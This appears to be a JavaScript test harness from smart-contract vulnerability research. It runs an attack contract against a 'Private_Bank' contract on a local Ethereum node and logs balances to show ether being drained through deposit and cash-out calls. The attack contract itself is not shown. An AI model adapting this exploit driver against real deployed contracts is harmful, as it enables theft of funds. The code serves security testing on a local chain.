

const request = require("request");


const AbiCoder = require('web3-eth-abi');
const abiCoder = new AbiCoder.AbiCoder();

const Web3 = require('web3');
const Promise = require("bluebird");
const truffle_Contract = require('truffle-contract');
const assert = require('assert');
const tracer = require('./EVM2Code');
const fs = require('fs');
const locks = require('locks');
// mutex
const mutex = locks.createMutex();
const async = require('async');
let httpRpcAddr = "http://localhost:8546"
Provider = new Web3.providers.HttpProvider(httpRpcAddr);
web3  =  new Web3(new Web3.providers.HttpProvider(httpRpcAddr));
let g_account_list = web3.eth.accounts;
let g_from_account = g_account_list[0];
  /// unlock initial user, which is also miner account
web3.personal.unlockAccount(g_from_account, "123", 200 * 60 * 60);


async function get_instance(artifact_path){
  let artifact = require(artifact_path);
  let network_id = Object.keys(artifact["networks"])[0];
  let conf = {
    contract_name:artifact["contractName"],
    abi:  artifact["abi"],                     // Array; required.  Application binary interface.
    unlinked_binary: artifact["bytecode"],       // String; optional. Binary without resolve library links.
    address: artifact["networks"][network_id]["address"],               // String; optional. Deployed address of contract.
    network_id: parseInt(network_id),            // String; optional. ID of network being saved within abstraction.
    default_network: parseInt(network_id)       // String; optional. ID of default network this abstraction should use.
  };
  // console.log(conf);
  let MyContract = truffle_Contract(conf);
  MyContract.setProvider(Provider);
  let instance = await MyContract.deployed();
  return instance;
}
async function send(){
  let private_bank = await get_instance("../build/contracts/Private_Bank.json");
  await web3.eth.sendTransaction({from:g_from_account,to:private_bank.address,value:10000000000000000000,gas:500000000000});
}
async function test(){
  let private_bank = await get_instance("../build/contracts/Private_Bank.json");
  let attack_private_bank = await get_instance("../build/contracts/Attack_Private_Bank0.json");
  let bal_private = await web3.eth.getBalance(private_bank.address);
  let bal_attack_private = await web3.eth.getBalance(attack_private_bank.address);
  console.log("Before");
  console.log("ether of contract:",bal_private.toString(),bal_attack_private.toString());
  let book_val = await private_bank.balances(attack_private_bank.address,{from:g_from_account,gas:500000000000});
  console.log("book of contract:",book_val.toString())
  await attack_private_bank.vultron_Deposit(10000000000000000000,{from:g_from_account,gas:500000000000});
 
  book_val = await private_bank.balances(attack_private_bank.address,{from:g_from_account,gas:500000000000});
  console.log("Middle");
  console.log("book of contract:",book_val.toString())
  bal_private = await web3.eth.getBalance(private_bank.address);
  bal_attack_private = await web3.eth.getBalance(attack_private_bank.address);
  console.log("ether of contract:",bal_private.toString(),bal_attack_private.toString());


  await attack_private_bank.vultron_CashOut(10000000000000000000,{from:g_from_account,gas:50000000000000});

  console.log("After");
  book_val = await private_bank.balances(attack_private_bank.address,{from:g_from_account,gas:500000000000});
  console.log(book_val.toString())
  bal_private = await web3.eth.getBalance(private_bank.address);
  bal_attack_private = await web3.eth.getBalance(attack_private_bank.address);
  console.log("ether of contract:",bal_private.toString(),bal_attack_private.toString());
  book_val = await private_bank.balances(attack_private_bank.address,{from:g_from_account,gas:500000000000});
  console.log("book of contract:",book_val.toString())
    
}
test();
// send();
